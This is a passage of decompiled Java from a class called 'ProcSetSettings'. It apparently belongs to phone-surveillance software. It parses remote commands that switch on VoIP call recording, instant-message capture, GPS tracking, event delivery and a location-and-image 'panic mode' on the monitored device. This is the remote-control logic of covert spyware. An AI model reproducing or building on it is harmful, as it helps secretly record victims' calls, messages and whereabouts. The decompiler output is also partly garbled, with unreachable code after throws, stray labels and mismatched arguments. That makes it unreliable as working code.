      localObject2 = Integer.valueOf(i);
      boolean bool3 = paramHashMap.containsKey(localObject2);
      if (bool3)
      {
        localObject2 = Integer.valueOf(i);
        localObject2 = (String)paramHashMap.get(localObject2);
        if (localObject2 == null) {
          break label589;
        }
      }
      for (;;)
      {
        try
        {
          localObject2 = ((String)localObject2).trim();
          i2 = Integer.parseInt((String)localObject2);
        }
        catch (NumberFormatException localNumberFormatException2)
        {
          int i5;
          label347:
          int i2 = n;
          continue;
          localObject4 = new com/vvt/remotecontrol/ControlCommand;
          localObject5 = RemoteFunction.SET_EVENT_TIMER;
          localInteger2 = Integer.valueOf(i2);
          ((ControlCommand)localObject4).<init>((RemoteFunction)localObject5, localInteger2);
          localArrayList.add(localObject4);
          localObject4 = new com/vvt/remotecontrol/ControlCommand;
          localObject5 = RemoteFunction.ENABLE_EVENT_DELIVERY;
          if (i2 == 0) {
            break label527;
          }
        }
        if (i2 < 0)
        {
          i5 = 24;
          if (i2 > i5)
          {
            localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
            ((InvalidCommanFormatException)localObject2).<init>();
            throw ((Throwable)localObject2);
            i2 = 0;
            localObject2 = null;
            break;
          }
        }
        Object localObject3 = Boolean.valueOf(k);
        ((ControlCommand)localObject4).<init>((RemoteFunction)localObject5, localObject3);
        localArrayList.add(localObject4);
        localObject3 = Integer.valueOf(66);
        boolean bool4 = paramHashMap.containsKey(localObject3);
        if (bool4)
        {
          i3 = 66;
          localObject3 = Integer.valueOf(i3);
          localObject3 = (String)paramHashMap.get(localObject3);
          if (localObject3 == null) {
            break label582;
          }
        }
        for (;;)
        {
          try
          {
            localObject3 = ((String)localObject3).trim();
            i3 = Integer.parseInt((String)localObject3);
          }
          catch (NumberFormatException localNumberFormatException3)
          {
            int m;
            label527:
            i3 = n;
            continue;
            ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
            localRemoteFunction = RemoteFunction.SET_DELIVERY_METHOD;
            Integer localInteger1 = Integer.valueOf(i3);
            localControlCommand.<init>(localRemoteFunction, localInteger1);
            localArrayList.add(localControlCommand);
          }
          if (i3 >= 0)
          {
            m = 2;
            if (i3 <= m) {}
          }
          else
          {
            localObject3 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
            ((InvalidCommanFormatException)localObject3).<init>();
            throw ((Throwable)localObject3);
            m = 0;
            localControlCommand = null;
            break;
          }
          return localArrayList;
          label582:
          i3 = n;
        }
        label589:
        i3 = n;
      }
      label596:
      int i3 = n;
    }
  }
  
  ArrayList c(HashMap paramHashMap)
  {
    int i = 403;
    int j = 402;
    int k = 401;
    int m = 400;
    int n = 37;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    Object localObject1 = Integer.valueOf(n);
    boolean bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, n);
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(k);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, k);
      localObject2 = Integer.valueOf(k);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(410);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 410);
      n = 410;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(404);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 404);
      n = 404;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(m);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, m);
      localObject2 = Integer.valueOf(m);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(j);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, j);
      localObject2 = Integer.valueOf(j);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(i);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, i);
      localObject2 = Integer.valueOf(i);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject2 = RemoteFunction.ENABLE_VOIP_CALL_RECORDING;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, localHashMap);
    localArrayList.add(localObject1);
    return localArrayList;
  }
  
  ArrayList c(HashMap paramHashMap, int paramInt)
  {
    Integer localInteger = Integer.valueOf(paramInt);
    String[] arrayOfString = ((String)paramHashMap.get(localInteger)).split(";");
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i = arrayOfString.length;
    int j = 0;
    localInteger = null;
    while (j < i)
    {
      String str = arrayOfString[j].trim();
      localArrayList.add(str);
      j += 1;
    }
    return localArrayList;
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  RmtCtrlInputCallRecordingAudioSource d(HashMap paramHashMap, int paramInt)
  {
    RmtCtrlInputCallRecordingAudioSource localRmtCtrlInputCallRecordingAudioSource = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource;
    localRmtCtrlInputCallRecordingAudioSource.<init>();
    Object localObject = Integer.valueOf(paramInt);
    localObject = (String)paramHashMap.get(localObject);
    int i = -1;
    if (localObject != null) {
      localObject = ((String)localObject).trim();
    }
    for (;;)
    {
      try
      {
        localObject = ((String)localObject).trim();
        j = Integer.parseInt((String)localObject);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        j = i;
        continue;
        localRmtCtrlInputCallRecordingAudioSource.setAudioSource(localNumberFormatException);
        return localRmtCtrlInputCallRecordingAudioSource;
      }
      localObject = RmtCtrlInputCallRecordingAudioSource.AudioSource.forValue(j);
      if (localObject == null)
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
      }
      int j = i;
    }
  }
  
  ArrayList d(HashMap paramHashMap)
  {
    int i = 203;
    int j = 202;
    int k = 201;
    int m = 200;
    int n = 8;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    Object localObject1 = Integer.valueOf(n);
    boolean bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, n);
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(204);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 204);
      n = 204;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(j);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, j);
      localObject2 = Integer.valueOf(j);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(211);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 211);
      n = 211;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(k);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, k);
      localObject2 = Integer.valueOf(k);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(i);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, i);
      localObject2 = Integer.valueOf(i);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(206);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 206);
      n = 206;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(208);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 208);
      n = 208;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(m);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, m);
      localObject2 = Integer.valueOf(m);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(209);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 209);
      n = 209;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(210);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 210);
      n = 210;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(213);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 213);
      n = 213;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(214);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 214);
      n = 214;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(215);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 215);
      n = 215;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(216);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 216);
      n = 216;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(217);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 217);
      n = 217;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = Integer.valueOf(218);
    bool = paramHashMap.containsKey(localObject1);
    if (bool)
    {
      bool = a(paramHashMap, 218);
      n = 218;
      localObject2 = Integer.valueOf(n);
      localObject1 = Boolean.valueOf(bool);
      localHashMap.put(localObject2, localObject1);
    }
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject2 = RemoteFunction.ENABLE_CAPTURE_IM;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, localHashMap);
    localArrayList.add(localObject1);
    return localArrayList;
  }
  
  ControlCommand e(HashMap paramHashMap)
  {
    int i = 75;
    Object localObject1 = Integer.valueOf(i);
    boolean bool2 = paramHashMap.containsKey(localObject1);
    Object localObject3;
    RmtCtrlInputImAttachmentLimitSize localRmtCtrlInputImAttachmentLimitSize;
    if (bool2)
    {
      localObject1 = Integer.valueOf(i);
      localObject1 = (String)paramHashMap.get(localObject1);
      boolean bool1 = a;
      if (bool1) {}
      localObject3 = Arrays.asList(((String)localObject1).split(";"));
      localRmtCtrlInputImAttachmentLimitSize = new com/vvt/remotecontrol/input/RmtCtrlInputImAttachmentLimitSize;
      localRmtCtrlInputImAttachmentLimitSize.<init>();
      bool2 = false;
    }
    Object localObject2;
    for (localObject1 = null;; localObject2 = null)
    {
      try
      {
        localObject1 = ((List)localObject3).get(0);
        localObject1 = (String)localObject1;
        localObject1 = ((String)localObject1).trim();
        int k = Integer.parseInt((String)localObject1) * 1024 * 1024;
        int m = 0;
        long l1 = k;
        localRmtCtrlInputImAttachmentLimitSize.setImAttchmentLimitSize(0, l1);
        k = 1;
        localObject1 = ((List)localObject3).get(k);
        localObject1 = (String)localObject1;
        localObject1 = ((String)localObject1).trim();
        k = Integer.parseInt((String)localObject1) * 1024 * 1024;
        m = 1;
        l1 = k;
        localRmtCtrlInputImAttachmentLimitSize.setImAttchmentLimitSize(m, l1);
        k = 2;
        localObject1 = ((List)localObject3).get(k);
        localObject1 = (String)localObject1;
        localObject1 = ((String)localObject1).trim();
        k = Integer.parseInt((String)localObject1) * 1024 * 1024;
        m = 2;
        l1 = k;
        localRmtCtrlInputImAttachmentLimitSize.setImAttchmentLimitSize(m, l1);
        k = 3;
        localObject1 = ((List)localObject3).get(k);
        localObject1 = (String)localObject1;
        localObject1 = ((String)localObject1).trim();
        k = Integer.parseInt((String)localObject1) * 1024 * 1024;
        int j = 3;
        long l2 = k;
        localRmtCtrlInputImAttachmentLimitSize.setImAttchmentLimitSize(j, l2);
        localObject1 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.SET_IM_ATTACHMENT_LIMIT_SIZE;
        ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, localRmtCtrlInputImAttachmentLimitSize);
        return (ControlCommand)localObject1;
      }
      catch (NumberFormatException localNumberFormatException)
      {
        bool3 = b;
        if (!bool3) {}
      }
      boolean bool3 = false;
    }
  }
  
  public String e()
  {
    return "ProcSetSettings";
  }
  
  ArrayList f(HashMap paramHashMap)
  {
    int i = 46;
    int j = 7;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = Integer.valueOf(i);
    boolean bool1 = paramHashMap.containsKey(localObject1);
    if (bool1)
    {
      localObject1 = Integer.valueOf(i);
      localObject1 = (String)paramHashMap.get(localObject1);
      i = -1;
      try
      {
        k = Integer.parseInt((String)localObject1);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        int k;
        for (;;)
        {
          k = i;
        }
        localControlCommand = new com/vvt/remotecontrol/ControlCommand;
        localRemoteFunction = RemoteFunction.SET_GPS_TIME_INTERVAL;
        localObject2 = Integer.valueOf(k);
        localControlCommand.<init>(localRemoteFunction, localObject2);
        localArrayList.add(localControlCommand);
      }
      i = 1;
      if (k < i)
      {
        localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
    }
    ControlCommand localControlCommand;
    RemoteFunction localRemoteFunction;
    Object localObject2 = Integer.valueOf(j);
    boolean bool2 = paramHashMap.containsKey(localObject2);
    if (bool2)
    {
      bool2 = a(paramHashMap, j);
      localControlCommand = new com/vvt/remotecontrol/ControlCommand;
      localRemoteFunction = RemoteFunction.ENABLE_CAPTURE_GPS;
      localObject2 = Boolean.valueOf(bool2);
      localControlCommand.<init>(localRemoteFunction, localObject2);
      localArrayList.add(localControlCommand);
    }
    return localArrayList;
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
  
  RmtCtrlInputPanicMode g(HashMap paramHashMap)
  {
    int i = 2;
    int j = 1;
    RmtCtrlInputPanicMode localRmtCtrlInputPanicMode = new com/vvt/remotecontrol/input/RmtCtrlInputPanicMode;
    localRmtCtrlInputPanicMode.<init>();
    int k = -1;
    int m = 47;
    Object localObject = Integer.valueOf(m);
    localObject = (String)paramHashMap.get(localObject);
    if (localObject != null) {}
    for (;;)
    {
      try
      {
        localObject = ((String)localObject).trim();
        m = Integer.parseInt((String)localObject);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        RmtCtrlInputPanicMode.Mode localMode;
        m = k;
        continue;
        InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        localInvalidCommanFormatException.<init>();
        throw localInvalidCommanFormatException;
      }
      if ((m >= j) && (m <= i))
      {
        if (m == j)
        {
          localMode = RmtCtrlInputPanicMode.Mode.LOCATION_AND_IMAGE;
          localRmtCtrlInputPanicMode.setMode(localMode);
        }
        if (m == i)
        {
          localObject = RmtCtrlInputPanicMode.Mode.LOCATION_ONLY;
          localRmtCtrlInputPanicMode.setMode((RmtCtrlInputPanicMode.Mode)localObject);
        }
        return localRmtCtrlInputPanicMode;
      }
      m = k;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/p.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */